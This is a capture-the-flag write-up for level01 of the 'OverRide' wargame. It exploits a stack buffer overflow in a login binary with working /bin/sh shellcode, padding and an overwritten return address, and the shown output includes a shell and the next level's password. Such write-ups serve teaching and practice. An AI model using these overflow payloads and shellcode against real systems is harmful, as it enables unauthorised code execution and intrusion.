The program displays a prompt before asking the user for its username. The input is then checked and well, bad luck, my input is not valid. So let's look at the assembly code.

There are three functions: main(), verify_user_name() and verify_user_pass(). Please check the [source code](../source.c) for more details. If we look closely, we can see that the credentials appear in hard copy in the code. Thus the expected username is "dat_wil" and the password is "admin". But we can also see that the code is broken: when filling in the proper password, the program still displays an error message. Anyway, this is not the way to pass this level.

Looking at the reconstructed source code, we see that the second fgets() writes up to 100 bytes in a local variable that can only hold 64 bytes. We can therefore carry out a buffer overflow attack and overwrite the address pointed to by EIP.

We find with the help of gdb that the offset of EIP is 80 bytes. Moreover, we find the address of the local variable (0xffffd6cc) using the ltrace command:
```
level01@OverRide:~$ ltrace ./level01 
__libc_start_main(0x80484d0, 1, -10316, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***")                                                = 39
printf("Enter Username: ")                                                              = 16
fgets("dat_wil\n", 256, 0xf7fcfac0)                                                     = 0x0804a040
puts("verifying username....\n"verifying username....)                                  = 24
puts("Enter Password: ")                                                                = 17
fgets("admin\n", 100, 0xf7fcfac0)                                                       = 0xffffd6cc
puts("nope, incorrect password...\n")                                                   = 29
+++ exited (status 1) +++
```

Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [This one](https://shell-storm.org/shellcode/files/shellcode-841.php) corresponds to what we want to do. It is 21 bytes long so we will need to complete our input with 59 bytes of padding in order to reach EIP. We will then pass the address of the local variable so that our shellcode becomes the next instruction in the program. The address must be written in the little endian convention in order to be readable by the computer. 

```
level01@OverRide:~$ python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + 59 * "A" + "\xcc\xd6\xff\xff"' > /tmp/exp
```

In order to keep the shell open, we add a dash ('-') at the end of the cat command, in order to keep reading on the standard input until it meets an EOF ('^D') character:
```
level01@OverRide:~$ cat /tmp/exp - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02    
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
We can now reach the next level with the command `su level02` and fill in the flag found as a password.